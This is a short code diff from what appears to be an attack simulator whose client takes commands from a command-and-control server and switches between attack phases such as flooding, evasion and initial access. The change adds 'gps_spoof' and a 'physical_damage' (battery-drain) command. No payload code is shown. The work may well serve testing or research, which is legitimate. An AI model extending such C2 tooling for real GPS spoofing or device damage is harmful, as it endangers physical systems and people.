@@ -100,9 +100,16 @@ def main():
                     cmd = instruction.get("cmd")
                     print(f"\n{C_GREEN}[+] C2 COMMAND RECEIVED: {C_BOLD}{cmd.upper()}{C_END}")
                     
-                    if cmd in ["spoof", "flood", "evasion", "hardware", "impact", "normal", "initial_access", "execution"]:
-                        dynamic_phase = cmd
-                        print(f"{C_YELLOW}[!] Switched Attack Phase to: {cmd.upper()}{C_END}")
+                    if cmd in ["spoof", "gps_spoof", "flood", "evasion", "hardware", "impact", "physical_damage", "normal", "initial_access", "execution"]:
+                        if cmd == "physical_damage":
+                            dynamic_phase = "impact"
+                            print(f"{C_RED}[!] CRITICAL: PHYSICAL DAMAGE (BATTERY DRAIN) ATTACK INITIATED!{C_END}")
+                        elif cmd == "gps_spoof":
+                            dynamic_phase = "spoof"
+                            print(f"{C_YELLOW}[!] Switched Attack Phase to: SPOOF{C_END}")
+                        else:
+                            dynamic_phase = cmd
+                            print(f"{C_YELLOW}[!] Switched Attack Phase to: {cmd.upper()}{C_END}")
             except Exception as e:
                 break
                 
